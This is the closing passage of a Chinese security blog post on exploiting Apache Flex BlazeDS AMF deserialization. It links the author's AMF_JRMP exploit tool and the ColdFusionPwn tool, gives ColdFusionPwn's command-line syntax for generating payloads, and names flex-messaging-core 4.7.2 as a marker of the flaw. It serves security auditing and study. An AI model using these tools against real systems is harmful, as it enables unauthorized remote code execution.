<p>当然这只是基于实现了<code>Externalizable</code>接口的反序列化利用，在判断即使没有实现<code>Externalizable</code>，流程依旧会往下走其他反序列化逻辑，也就是说，哪怕没有实现<code>Externalizable</code>接口，也可以找实现了<code>Serializable</code> 接口的链来进行利用，当然还是需要有公共无参构造方法</p>
<p> </p>
<h1 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h1><p>写了个利用工具<br><a target="_blank" rel="noopener" href="https://github.com/novysodope/AMF_JRMP">https://github.com/novysodope/AMF_JRMP</a></p>
<p>不出网参考<br><a target="_blank" rel="noopener" href="https://github.com/codewhitesec/ColdFusionPwn">https://github.com/codewhitesec/ColdFusionPwn</a><br>ColdFusionPwn直接下载他的发布版本使用会提示找不到主类，建议下载源码用idea运行，参数直接<code>[-s|-e] [payload type] &#39;[command]&#39; [outfile] </code></p>
<h1 id="Tips"><a href="#Tips" class="headerlink" title=" Tips"></a> Tips</h1><p>在往后的审计中，如果看到有引用</p>
<figure class="highlight"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">&lt;dependency&gt;<br>&lt;groupId&gt;org.apache.flex.blazeds&lt;/groupId&gt;<br>&lt;artifactId&gt;flex-messaging-core&lt;/artifactId&gt;<br>&lt;version&gt;4.7.2&lt;/version&gt;<br>&lt;/dependency&gt;<br></code></pre></div></td></tr></table></figure>
<p>或者jar包中用到这种的</p>
<p><img src="/images/105/wfjgdK38fKyA5Ts7GDyJmFt0IwEgqANTStMI9ey5ZDM.png" srcset="/img/loading.gif" lazyload alt="image"></p>
<p>基本可以确定存在flex相关漏洞</p>

            </div>
            <hr>
            <div>
              <div class="post-metas mb-3">
                
                  <div class="post-meta mr-3">
                    <i class="iconfont icon-category"></i>
                    
                      <a class="hover-with-bg" href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a>
                    
                  </div>
                
                
                  <div class="post-meta">
                    <i class="iconfont icon-tags"></i>
                    
                      <a class="hover-with-bg" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a>
                    
                  </div>
                
              </div>
              
                <p class="note note-warning">
                  
                    声明：<br>   本文章用于学习交流，严禁用于非法操作，出现后果一切自行承担，阅读此文章表示你已同意本声明。<br> <br> Disclaimer: <br>   This article is for study and communication. It is strictly forbidden to use it for illegal operations. All consequences shall be borne by yourself. Reading this article means that you have agreed to this statement.
                  
                </p>
              
              
                <div class="post-prevnext">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2022/05/31/81/">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">tapestry反序列化 CVE-2021-27850分析</span>
                        <span class="visible-mobile">上一篇</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2022/05/11/80/">
                        <span class="hidden-mobile">luckyframeweb3.5 sql inject 3</span>
                        <span class="visible-mobile">下一篇</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
          </article>
        </div>
      </div>
    </div>
    
      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
        <div id="toc">
  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
  <div class="toc-body" id="toc-body"></div>
</div>

      </div>
    
  </div>
</div>

<!-- Custom -->

  <div class="col-lg-7 mx-auto nopadding-x-md">
    <div class="container custom post-custom mx-auto">
      <img src="/img/aa.png" srcset="/img/loading.gif" lazyload class="rounded mx-auto d-block mt-5" style="width:150px; height:150px;"><p></p> <p style="text-align:center"><span>扫一扫关注我们</span></p>
    </div>
  </div>


    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v"
                 for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>
    

    
  </main>

  <footer class="text-center mt-5 py-3">
  <div class="footer-content">
     © 2018-<script type="text/javascript">document.write(new Date().getFullYear());</script> <span> <a href="#" target="_blank" rel="nofollow noopener"><font color="#2ca6cb">novy`s Blog</font>.</a> </span> Powered by <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span><font color="#2ca6cb">Hexo</font></span></a><p><script> function secondToDate(second) { if (!second) { return 0; } var time = new Array(0, 0, 0, 0, 0); if (second >= 365 * 24 * 3600) { time[0] = parseInt(second / (365 * 24 * 3600)); second %= 365 * 24 * 3600; } if (second >= 24 * 3600) { time[1] = parseInt(second / (24 * 3600)); second %= 24 * 3600; } if (second >= 3600) { time[2] = parseInt(second / 3600); second %= 3600; } if (second >= 60) { time[3] = parseInt(second / 60); second %= 60; } if (second > 0) { time[4] = second; } return time; }</script> <script type="text/javascript" language="javascript"> function setTime() { var create_time = Math.round(new Date(Date.UTC(2018, 11, 09, 6, 6, 6)).getTime() / 1000); var timestamp = Math.round((new Date().getTime() + 8 * 60 * 60 * 1000) / 1000); currentTime = secondToDate((timestamp - create_time)); currentTimeHtml = currentTime[0] + "年" + currentTime[1] + "天" + currentTime[2] + "时" + currentTime[3] + "分" + currentTime[4] + "秒"; document.getElementById("htmer_time").innerHTML = currentTimeHtml; }    setInterval(setTime, 1000);</script> 本博客已经稳定运行：<span id="htmer_time" style="color: #2ca6cb;"></span> <br/> <script async="" src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>

你是第<font color="#2ca6cb"><span id="busuanzi_value_site_uv"></span></font>个小伙伴 </p> 
  </div>
  

  

  
</footer>


  <!-- SCRIPTS -->
  
  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js" ></script>
<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>

<!-- Plugins -->


  <script  src="/js/local-search.js" ></script>



  
    <script  src="/js/img-lazyload.js" ></script>
  



  



  
    <script  src="https://cdn.jsdelivr.net/npm/tocbot@4/dist/tocbot.min.js" ></script>
  
  
    <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3/dist/jquery.fancybox.min.js" ></script>
  
  
    <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4/anchor.min.js" ></script>
  
  
    <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js" ></script>
  



  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>




  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2/lib/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var title = document.getElementById('subtitle').title;
      
      typing(title)
      
    })(window, document);
  </script>












  
    <!-- Baidu Analytics -->
    <script defer>
      var _hmt = _hmt || [];
      (function () {
        var hm = document.createElement("script");
        hm.src = "https://hm.baidu.com/hm.js?a6c1581442f57290135c4581f8de49ff";
        var s = document.getElementsByTagName("script")[0];
        s.parentNode.insertBefore(hm, s);
      })();
    </script>
  

  

  

  

  

  






<script  src="/js/boot.js" ></script>


</body>
</html>
